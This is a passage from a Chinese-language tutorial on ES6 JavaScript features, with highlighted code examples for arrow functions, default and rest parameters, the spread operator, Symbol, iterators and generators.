class="line"><span class="keyword">let</span> <span class="title function_">fn</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>); <span class="comment">// 报错，arguments未定义</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><ul><li>箭头函数的简写<ul><li><ol><li>省略小括号, 当形参有且只有一个的时候</li></ol></li><li><ol start="2"><li>省略花括号, 当代码体只有一条语句的时候, 花括号可以省略，return 必须省略，函数的返回值为该条语句的执行结果</li></ol></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title function_">fn2</span> = num =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> num * <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">pow</span> = n =&gt; n * n;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">pow</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure><p><code>注意：箭头函数不会更改 this 指向，用来指定回调函数会非常合适</code><br><code>箭头函数适合与 this 无关的回调: 定时器, 数组的方法回调</code><br><code>箭头函数不适合与 this 有关的回调: 事件回调, 对象的方法</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;lili&#x27;</span>,</span><br><span class="line">    <span class="attr">getName</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// this指向obj对象</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">getName1</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// this指向obj外层作用域，window</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="箭头函数实践"><a href="#箭头函数实践" class="headerlink" title="箭头函数实践"></a>箭头函数实践</h3><ul><li>需求-1 点击 div 2s 后颜色变成『粉色』</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取元素</span></span><br><span class="line"><span class="keyword">let</span> ad = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ad&#x27;</span>);</span><br><span class="line"><span class="comment">//绑定事件</span></span><br><span class="line">ad.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//保存 this 的值</span></span><br><span class="line">    <span class="keyword">let</span> _this = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">//定时器</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//修改背景颜色 this</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>); <span class="comment">// window</span></span><br><span class="line">        _this.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;pink&#x27;</span>; <span class="comment">// 生效</span></span><br><span class="line">        <span class="comment">// this.style.background = &#x27;pink&#x27;; // 报错</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/********************************************/</span></span><br><span class="line"></span><br><span class="line">ad.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//保存 this 的值</span></span><br><span class="line">    <span class="comment">// let _this = this;</span></span><br><span class="line">    <span class="comment">//定时器</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">//修改背景颜色 this</span></span><br><span class="line">        <span class="comment">// console.log(this);</span></span><br><span class="line">        <span class="comment">// _this.style.background = &#x27;pink&#x27;;</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">background</span> = <span class="string">&#x27;pink&#x27;</span>; <span class="comment">// 生效</span></span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>需求-2 从数组中返回偶数的元素</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="number">1</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">25</span>];</span><br><span class="line"><span class="keyword">const</span> result = arr.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (item % <span class="number">2</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/********************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> result = arr.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item % <span class="number">2</span> === <span class="number">0</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br></pre></td></tr></table></figure><hr><h2 id="函数参数的默认值设置"><a href="#函数参数的默认值设置" class="headerlink" title="函数参数的默认值设置"></a>函数参数的默认值设置</h2><ul><li>形参初始值 具有默认值的参数, 一般位置要靠后(潜规则)</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b,c=<span class="number">10</span></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result) <span class="comment">// 13</span></span><br></pre></td></tr></table></figure><ul><li>与解构赋值结合</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">connect</span>(<span class="params">&#123;host=<span class="string">&quot;127.0.0.1&quot;</span>, username, password, port&#125;</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(host) <span class="comment">// 127.0.0.1</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(username)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(password)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(port)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">connect</span>(&#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">password</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">3306</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><hr><h2 id="rest-参数"><a href="#rest-参数" class="headerlink" title="rest 参数"></a>rest 参数</h2><p><code>形式为&quot;…变量名&quot;</code>，</p><p>位置：<code>函数声明的形参的位置</code></p><p><strong>ES6 引入 rest 参数，用于获取函数的实参，用来代替 arguments</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5 获取实参的方式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">date</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>); <span class="comment">// typeof arguments--&gt;Object</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">date</span>(<span class="string">&#x27;白芷&#x27;</span>,<span class="string">&#x27;阿娇&#x27;</span>,<span class="string">&#x27;思慧&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest 参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">...args</span>)&#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(args); <span class="comment">// [1,2,3,4,5]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest 参数必须是最后一个形参</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">minus</span>(<span class="params">a,b,...args</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a,b,args); <span class="comment">// args: [2,3,4,5,19]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">minus</span>(<span class="number">100</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">19</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>rest参数</code>只包括那些<code>没有给出名称的参数</code>，<code>arguments</code>包含<code>所有参数</code><br><code>arguments 对象</code>不是真正的数组，而<code>rest</code> 参数是<code>数组实例</code>，可以直接应用<code>sort, map, forEach, pop等方法</code><br><code>arguments 对象拥有一些自己额外的功能</code></p><hr><h2 id="spread-扩展运算符"><a href="#spread-扩展运算符" class="headerlink" title="spread 扩展运算符"></a>spread 扩展运算符</h2><h3 id="扩展运算符"><a href="#扩展运算符" class="headerlink" title="扩展运算符"></a>扩展运算符</h3><p><strong>『…』 扩展运算符能将『数组』转换为逗号分隔的『参数序列』，对数组进行解包，它好比 rest 参数的逆运算</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明一个数组 ...</span></span><br><span class="line"><span class="keyword">const</span> tfboys = [<span class="string">&#x27;易烊千玺&#x27;</span>,<span class="string">&#x27;王源&#x27;</span>,<span class="string">&#x27;王俊凯&#x27;</span>]; <span class="comment">// 转=&gt; &#x27;易烊千玺&#x27;,&#x27;王源&#x27;,&#x27;王俊凯&#x27;</span></span><br><span class="line"><span class="comment">// 声明一个函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">chunwan</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 位置：函数调用的实参</span></span><br><span class="line"><span class="title function_">chunwan</span>(...tfboys);<span class="comment">// chunwan(&#x27;易烊千玺&#x27;,&#x27;王源&#x27;,&#x27;王俊凯&#x27;)</span></span><br></pre></td></tr></table></figure><h3 id="扩展运算符应用"><a href="#扩展运算符应用" class="headerlink" title="扩展运算符应用"></a>扩展运算符应用</h3><ul><li>数组的合并</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> kuaizi = [<span class="string">&#x27;王太利&#x27;</span>,<span class="string">&#x27;肖央&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> fenghuang = [<span class="string">&#x27;曾毅&#x27;</span>,<span class="string">&#x27;玲花&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> zuixuanxiaopingguo = kuaizi.<span class="title function_">concat</span>(fenghuang); <span class="comment">// es5</span></span><br><span class="line"><span class="keyword">const</span> zuixuanxiaopingguo = [...kuaizi, ...fenghuang];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zuixuanxiaopingguo); <span class="comment">// [&#x27;王太利&#x27;,&#x27;肖央&#x27;, &#x27;曾毅&#x27;,&#x27;玲花&#x27;]</span></span><br></pre></td></tr></table></figure><ul><li>数组的克隆</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sanzhihua = [<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;M&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> sanyecao = [...sanzhihua]; <span class="comment">//  [&#x27;E&#x27;,&#x27;G&#x27;,&#x27;M&#x27;] 浅拷贝</span></span><br></pre></td></tr></table></figure><ul><li>将伪数组转为真正的数组</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> divs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(divs); <span class="comment">// typeof --&gt; object</span></span><br><span class="line"><span class="keyword">const</span> divArr = [...divs];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(divArr); <span class="comment">// [div, div, div]</span></span><br></pre></td></tr></table></figure><hr><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><h3 id="Symbol-基本使用"><a href="#Symbol-基本使用" class="headerlink" title="Symbol 基本使用"></a>Symbol 基本使用</h3><p>ES6 引入了一种新的原始数据类型 <code>Symbol</code>，表示<code>独一无二的值</code>。它是JavaScript 语言的第<code>七</code>种数据类型，是一种类似于<code>字符串</code>的数据类型。</p><p><strong>Symbol 特点</strong></p><ul><li><ol><li>Symbol 的值是<code>唯一</code>的，用来<code>解决命名冲突</code>的问题</li></ol></li><li><ol start="2"><li>Symbol 值不能与<code>其他数据</code>进行<code>运算</code></li></ol></li><li><ol start="3"><li>Symbol 定义的<code>对象属性</code>不能使用<code>for…in</code>循环遍历 ，但是可以使用<code>Reflect.ownKeys</code>来获取对象的所有<code>键名</code></li></ol></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建 Symbol</span></span><br><span class="line"><span class="keyword">let</span> s1 = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1, <span class="keyword">typeof</span> s1); <span class="comment">// Symbol(), &#x27;symbol&#x27; 不可见的唯一性</span></span><br><span class="line"><span class="keyword">let</span> s2 = <span class="title class_">Symbol</span>(<span class="string">&#x27;尚硅谷&#x27;</span>); <span class="comment">// Symbol(&#x27;尚硅谷&#x27;)</span></span><br><span class="line"><span class="keyword">let</span> s3 = <span class="title class_">Symbol</span>(<span class="string">&#x27;尚硅谷&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s2 === s3); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Symbol.for 创建 Symbol.for中Symbol是对象，Symbol()中是函数，因此Symbol是函数对象</span></span><br><span class="line"><span class="keyword">let</span> s4 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;尚硅谷&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> s5 = <span class="title class_">Symbol</span>.<span class="title function_">for</span>(<span class="string">&#x27;尚硅谷&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s4 === s5); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//不能与其他数据进行运算</span></span><br><span class="line"><span class="keyword">let</span> result = s1 + <span class="number">100</span>; <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// USONB</span></span><br><span class="line"><span class="comment">// u  undefined</span></span><br><span class="line"><span class="comment">// s  string  symbol</span></span><br><span class="line"><span class="comment">// o  object</span></span><br><span class="line"><span class="comment">// n  null number</span></span><br><span class="line"><span class="comment">// b  boolean</span></span><br></pre></td></tr></table></figure><h3 id="Symbol-创建对象属性"><a href="#Symbol-创建对象属性" class="headerlink" title="Symbol 创建对象属性"></a>Symbol 创建对象属性</h3><p>使用场景：<code>给对象添加属性和方法</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向对象中添加方法 up down</span></span><br><span class="line"><span class="keyword">let</span> game = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&#x27;俄罗斯方块&#x27;</span>,</span><br><span class="line">  <span class="attr">up</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">  <span class="attr">down</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个对象</span></span><br><span class="line"><span class="keyword">let</span> methods = &#123;</span><br><span class="line">  <span class="attr">up</span>: <span class="title class_">Symbol</span>(),</span><br><span class="line">  <span class="attr">down</span>: <span class="title class_">Symbol</span>()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">game[methods.<span class="property">up</span>] = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以改变形状&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">game[methods.<span class="property">down</span>] = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以快速下降!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(game);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.obj[Reflect.ownKeys(obj)[index]]()</span></span><br><span class="line"><span class="comment">//调用Symbol创建的函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(game)) <span class="comment">// [&#x27;name&#x27;, &#x27;up&#x27;, &#x27;down&#x27;, Symbol(), Symbol()]</span></span><br><span class="line">game[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(game)[<span class="number">3</span>]]()  <span class="comment">//up</span></span><br><span class="line">game[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(game)[<span class="number">4</span>]]()  <span class="comment">//down</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">不可以，Symbol()是个动态值，可以使用[Symbol()]</span></span><br><span class="line"><span class="comment">Symbol(): function()&#123;</span></span><br><span class="line"><span class="comment">  console.log(&quot;我可以发言&quot;)</span></span><br><span class="line"><span class="comment">&#125;,</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> youxi = &#123;</span><br><span class="line">  <span class="attr">name</span>:<span class="string">&quot;狼人杀&quot;</span>,</span><br><span class="line">  [<span class="title class_">Symbol</span>(<span class="string">&#x27;say&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我可以发言&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  [<span class="title class_">Symbol</span>(<span class="string">&#x27;zibao&#x27;</span>)]: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我可以自爆&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.Object.getOwnPropertySymbols(obj)[index](); 只获取Symbol类型</span></span><br><span class="line"><span class="comment">//调用Symbol创建的函数</span></span><br><span class="line"><span class="comment">//调用Symbol创建的函数</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertySymbols</span>(youxi); <span class="comment">// [Symbol(say), Symbol(zibao)]</span></span><br><span class="line">youxi[a[<span class="number">0</span>]](); <span class="comment">// 发言</span></span><br><span class="line">youxi[a[<span class="number">1</span>]](); <span class="comment">// 自爆</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*******************************************/</span></span><br><span class="line"><span class="keyword">let</span> up1 = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">let</span> down1 = <span class="title class_">Symbol</span>();</span><br><span class="line"><span class="keyword">let</span> game1 = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;YY&#x27;</span>,</span><br><span class="line">  <span class="title function_">up1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">down1</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  [up1]() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;向上&#x27;</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  [down1]() &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;向下&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.obj[方法名]()</span></span><br><span class="line"><span class="comment">//调用Symbol创建的函数</span></span><br><span class="line">game1[up1](); <span class="comment">// 向上</span></span><br><span class="line">game1[down1]();  <span class="comment">// 向下</span></span><br></pre></td></tr></table></figure><hr><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><h3 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h3><p><strong>迭代器（Iterator）就是一种机制。它是一种接口，为各种不同的数据结构提供统一的访问机制。任何数据结构只要部署 Iterator 接口，就可以完成遍历操作</strong></p><ul><li>ES6 创造了一种新的遍历命令 for…of 循环，Iterator 接口主要供 for…of 消费</li><li>原生具备 iterator 接口的数据(可用 for of 遍历)<ul><li>a) Array</li><li>b) Arguments</li><li>c) Set</li><li>d) Map</li><li>e) String</li><li>f) TypedArray</li><li>g) NodeList</li></ul></li><li>工作原理<ul><li>a) 创建一个指针对象，指向当前数据结构的起始位置</li><li>b) 第一次调用对象的 next 方法，指针自动指向数据结构的第一个成员</li><li>c) 接下来不断调用 next 方法，指针一直往后移动，直到指向最后一个成员</li><li>d) 每调用 next 方法返回一个包含 value 和 done 属性的对象</li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明一个数组</span></span><br><span class="line"><span class="keyword">const</span> xiyou = [<span class="string">&#x27;唐僧&#x27;</span>,<span class="string">&#x27;孙悟空&#x27;</span>,<span class="string">&#x27;猪八戒&#x27;</span>,<span class="string">&#x27;沙僧&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 for...of 遍历数组</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">of</span> xiyou)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v); <span class="comment">// &#x27;唐僧&#x27;,&#x27;孙悟空&#x27;,&#x27;猪八戒&#x27;,&#x27;沙僧&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用 for...in 遍历数组</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> v <span class="keyword">in</span> xiyou)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v); <span class="comment">// 0, 1, 2, 3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Symbol.iterator对应一个函数</span></span><br><span class="line"><span class="keyword">let</span> iterator = xiyou[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"><span class="comment">//调用对象的next方法</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: false, value: &quot;唐僧&quot;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: false, value: &quot;孙悟空&quot;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: false, value: &quot;猪八戒&quot;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: false, value: &quot;沙僧&quot;&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: true, value: undefined&#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iterator.<span class="title function_">next</span>()); <span class="comment">// &#123;done: true, value: undefined&#125;</span></span><br></pre></td></tr></table></figure><p><code>iterator 接口：就是对象里面的一个属性，属性名字叫Symbol.iterator</code><br><code>注: 需要自定义遍历数据的时候，要想到迭代器。</code></p><h3 id="Iterator自定义遍历数据"><a href="#Iterator自定义遍历数据" class="headerlink" title="Iterator自定义遍历数据"></a>Iterator自定义遍历数据</h3><ul><li>for…of遍历，每次返回结果是对象里属性的数组中的成员<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明一个对象</span></span><br><span class="line"><span class="keyword">const</span> banji = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;终极一班&quot;</span>,</span><br><span class="line">  <span class="attr">stus</span>: [</span><br><span class="line">    <span class="string">&#x27;xiaoming&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xiaoning&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xiaotian&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;knight&#x27;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">    <span class="comment">//索引变量</span></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">let</span> _this = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="comment">// 返回一个对象</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="comment">// next方法  </span></span><br><span class="line">      <span class="attr">next</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; _this.<span class="property">stus</span>.<span class="property">length</span>) &#123;</span><br><span class="line">          <span class="keyword">const</span> result = &#123; <span class="attr">value</span>: _this.<span class="property">stus</span>[index], <span class="attr">done</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">          <span class="comment">//下标自增</span></span><br><span class="line">          index++;</span><br><span class="line">          <span class="comment">//返回结果</span></span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> &#123;<span class="attr">value</span>: <span class="literal">undefined</span>, <span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历这个对象 </span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> v <span class="keyword">of</span> banji) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(v); <span class="comment">// &#x27;xiaoming&#x27;,&#x27;xiaoning&#x27;,&#x27;xiaotian&#x27;,&#x27;knight&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h2><h3 id="生成器函数声明和调用"><a href="#生成器函数声明和调用" class="headerlink" title="生成器函数声明和调用"></a>生成器函数声明和调用</h3><p><strong>生成器函数：</strong>是 ES6 提供的一种<code>异步</code>编程解决方案，语法行为与传统函数完全不同</p><ul><li>代码说明：<ul><li><ol><li><code>* </code>的位置没有限制</li></ol></li><li><ol start="2"><li>生成器函数返回的结果是<code>迭代器对象</code>，调用迭代器对象的 <code>next 方法</code>可以得到<code>yield 语句后的值</code></li></ol></li><li><ol start="3"><li><code>yield</code> 相当于函数的<code>暂停标记</code>，也可以认为是函数的<code>分隔符</code>，每调用一次<code>next方法</code>，执行一段代码</li></ol></li><li><ol start="4"><li><code>next方法</code>可以传递<code>实参</code>，作为 <code>上一个yield语句的返回值</code></li></ol></li></ul></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成器其实就是一个特殊的函数</span></span><br><span class="line"><span class="comment">//异步编程 </span></span><br><span class="line"><span class="comment">//yield：函数代码的分隔符</span></span><br><span class="line"><span class="keyword">function</span> * <span class="title function_">gen</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">111</span>);</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;一只没有耳朵&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">222</span>);</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;一只没有尾部&#x27;</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">333</span>);</span><br><span class="line">  <span class="keyword">yield</span> <span class="string">&#x27;真奇怪&#x27;</span>;</span><br><span class="line">  <span 